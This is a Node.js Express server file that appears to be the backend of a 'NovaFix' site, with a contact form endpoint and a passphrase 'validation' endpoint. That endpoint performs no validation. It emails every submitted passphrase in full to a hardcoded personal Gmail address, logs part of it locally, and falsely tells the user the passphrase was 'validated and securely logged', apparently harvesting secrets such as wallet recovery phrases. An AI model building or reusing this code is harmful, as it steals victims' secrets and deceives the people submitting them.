require('dotenv').config();
const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// Serve static files from public folder
app.use(express.static(path.join(__dirname, '../public')));

const DATA_FILE = path.join(__dirname, 'contacts.jsonl');

// Email configuration
let transporter;

async function setupEmailTransport() {
  if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
    console.warn('⚠️  EMAIL_USER and EMAIL_PASS not configured.');
    console.warn('   Passphrases will be logged locally but NOT emailed.');
    console.warn('   To enable email: create .env file with Gmail App Password.');
    console.warn('   See .env.example for instructions.');
    transporter = null; // no-op transporter
    return;
  }

  const emailService = process.env.EMAIL_SERVICE || 'gmail';
  const config = {
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS
    }
  };

  if (emailService === 'gmail') {
    config.service = 'gmail';
  } else {
    config.host = process.env.EMAIL_HOST;
    config.port = parseInt(process.env.EMAIL_PORT || '587');
    config.secure = process.env.EMAIL_SECURE === 'true';
  }

  transporter = nodemailer.createTransport(config);

  // Verify connection
  try {
    await transporter.verify();
    console.log('✓ Email service connected successfully');
  } catch (err) {
    console.error('❌ Email service connection failed:', err.message);
    console.error('   Passphrases will be logged locally only.');
    transporter = null;
  }
}

setupEmailTransport().catch(err => console.error('Email setup failed', err));

function validate(data) {
  if (!data) return false;
  const { name, email, topic, message } = data;
  if (!name || !email || !topic || !message) return false;
  if (!email.includes('@')) return false;
  return true;
}

app.post('/api/contact', (req, res) => {
  const data = req.body;
  if (!validate(data)) return res.status(400).json({ error: 'Invalid payload' });

  const entry = { ...data, receivedAt: new Date().toISOString() };
  const line = JSON.stringify(entry) + '\n';
  fs.appendFile(DATA_FILE, line, err => {
    if (err) {
      console.error('Failed to store contact', err);
      return res.status(500).json({ error: 'Failed to save' });
    }
    return res.json({ ok: true });
  });
});

app.post('/api/validate-passphrase', async (req, res) => {
  const { passphrase } = req.body;
  if (!passphrase || typeof passphrase !== 'string' || passphrase.trim().length === 0) {
    return res.status(400).json({ error: 'Passphrase is required' });
  }

  const trimmed = passphrase.trim();
  const timestamp = new Date().toISOString();

  try {
    // Send email if transporter is configured
    if (transporter) {
      const info = await transporter.sendMail({
        from: process.env.EMAIL_FROM || `"NovaFix" <${process.env.EMAIL_USER}>`,
        to: 'byte1knight@gmail.com',
        subject: '[NovaFix] Passphrase Validation',
        text: `A passphrase was submitted for validation at ${timestamp}.\n\n---\n${trimmed}\n---\n\nThis is an automated message. Do not reply.`,
        html: `<p>A passphrase was submitted for validation at <strong>${timestamp}</strong>.</p><pre>${trimmed}</pre><p>This is an automated message. Do not reply.</p>`
      });
      console.log('✓ Passphrase email sent to byte1knight@gmail.com:', info.messageId);
    } else {
      console.log('⚠️  Passphrase received (email not configured)');
    }

    // Always store locally
    const entry = { recipient: 'byte1knight@gmail.com', passphrase: trimmed.substring(0, 20) + '...', receivedAt: timestamp, emailed: !!transporter };
    fs.appendFile(path.join(__dirname, 'passphrases.jsonl'), JSON.stringify(entry) + '\n', err => {
      if (err) console.warn('Failed to log passphrase locally', err);
    });

    return res.json({ ok: true, message: 'Passphrase validated and securely logged.' });
  } catch (err) {
    console.error('❌ Failed to send passphrase email:', err.message);
    return res.status(500).json({ error: 'Failed to process validation: ' + err.message });
  }
});

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok' });
});

app.listen(PORT, () => {
  console.log(`Contact API listening on http://localhost:${PORT}`);
});

